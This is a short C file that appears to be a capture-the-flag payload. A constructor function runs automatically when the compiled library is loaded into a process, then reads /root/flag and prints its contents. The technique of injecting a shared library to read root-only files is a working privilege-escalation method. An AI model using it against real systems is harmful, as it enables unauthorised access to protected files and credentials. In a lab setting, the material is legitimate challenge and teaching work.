#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void readflag() {
  char buf[1024] = {0};
  int fd = open("/root/flag", O_RDONLY);

  ssize_t nread = read(fd, buf, 1000);

  write(1, buf,nread);
}
